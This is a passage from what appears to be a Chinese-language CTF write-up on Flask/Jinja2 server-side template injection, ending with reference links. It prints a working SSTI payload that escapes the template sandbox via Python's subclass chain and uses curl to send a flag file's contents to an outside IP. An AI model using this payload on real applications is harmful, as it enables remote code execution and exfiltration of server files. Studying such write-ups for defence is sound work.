{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://47.xxx.xxx.72:2333 -d `cat /flag_1s_Hera`') %}1{% endif %}


```

读取成功：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210525174725-36059136-bd3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210525174725-36059136-bd3e-1.png)

未完待续……
------

> 参考：
> 
> [https://evi0s.com/2018/11/26 / 深入 SSTI - 从 NCTF2018 两道 Flask 看 bypass 新姿势](https://evi0s.com/2018/11/26/%E6%B7%B1%E5%85%A5ssti-%E4%BB%8Enctf2018%E4%B8%A4%E9%81%93flask%E7%9C%8Bbypass%E6%96%B0%E5%A7%BF%E5%8A%BF/)
> 
> [https://misakikata.github.io/2020/04/python - 沙箱逃逸与 SSTI](https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/#SSTI)
> 
> [https://www.gem-love.com/ctf/2598.html](https://www.gem-love.com/ctf/2598.html)